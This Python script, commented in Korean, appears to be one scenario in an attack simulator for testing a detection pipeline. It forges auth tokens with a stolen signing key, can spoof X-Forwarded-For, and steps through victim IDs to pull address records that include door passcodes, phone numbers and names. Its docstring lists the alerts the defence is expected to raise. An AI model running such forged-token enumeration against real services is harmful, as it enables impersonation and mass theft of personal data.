"""
S4 — 서명키 탈취 + 즉시 Enumeration.

행위:
- 단일 IP에서 victim sub를 순차로 돌면서 매번 새 토큰 위조 (forge_token)
- 분당 60건 페이스 (--rps 1.0)
- 풀(`VICTIM_COUNT`명) 소진 또는 --duration 도달 시 종료
  (기본 --duration 30, VICTIM_COUNT=100이면 약 1분 40초에 소진)

기대 탐지:
- t=05:00 IP-사용자다양성(5분) override 100 → Slack 즉시
- t=05:30 Haiku 인시던트 리포트 발행
- MTTD 목표: 5~15분 (충분한 신호량 확보를 위해 VICTIM_COUNT 충분히 크게 설정 권장)
"""
import os
import sys
import time
import argparse
from pathlib import Path

from dotenv import load_dotenv

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT))

from lib.token_forge import forge_token
from lib.target_pool import get_sequential_pool
from lib.http_client import get_session, call_api

load_dotenv(_ROOT / ".env")


def run_s4(duration_minutes: int = 30, rps: float = 1.0):
    """
    Parameters
    ----------
    duration_minutes : 공격 지속 시간
    rps : 초당 요청 수 (1.0이면 분당 60건)
    """
    session = get_session()
    pool = get_sequential_pool()
    pool_idx = 0

    # XFF 위조용 source IP (없으면 위조 없이 실제 client IP로 호출)
    src_ip = os.environ.get("S4_SOURCE_IP")

    start_time = time.time()
    end_time = start_time + duration_minutes * 60
    request_count = 0
    success_count = 0

    print(f"[S4] 시작 — duration={duration_minutes}min, rps={rps}")
    print(f"[S4] target pool: {pool[0]} ~ {pool[-1]} ({len(pool)}명)")
    print(f"[S4] X-Forwarded-For: {src_ip or '(미위조)'}")

    try:
        while time.time() < end_time:
            if pool_idx >= len(pool):
                print(f"[S4] pool 소진 ({pool_idx}명) — 종료")
                break

            victim_id = pool[pool_idx]
            token = forge_token(victim_id)

            try:
                # AddressResponse — 현관비번+주소+전화+이름 묶음
                # 응답민감도(F-Resp) High 70 발동 패턴
                resp = call_api(session, f"/api/addresses/{victim_id}", token, src_ip=src_ip)
                request_count += 1
                if resp.status_code == 200:
                    success_count += 1

                if request_count % 60 == 0:
                    elapsed = (time.time() - start_time) / 60
                    print(
                        f"[S4] t={elapsed:.1f}min  req={request_count}  "
                        f"ok={success_count}  sub={victim_id}"
                    )

            except Exception as e:
                print(f"[S4] error sub={victim_id}: {e}")

            pool_idx += 1
            time.sleep(1.0 / rps)
    except KeyboardInterrupt:
        print(f"\n[S4] 사용자 중단")

    print(
        f"[S4] 종료 — 총 {request_count} 요청, {success_count} 성공, "
        f"{pool_idx}명 enumeration"
    )


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--duration", type=int, default=30, help="공격 지속 시간 (분)")
    parser.add_argument("--rps", type=float, default=1.0, help="초당 요청 수")
    args = parser.parse_args()
    run_s4(args.duration, args.rps)
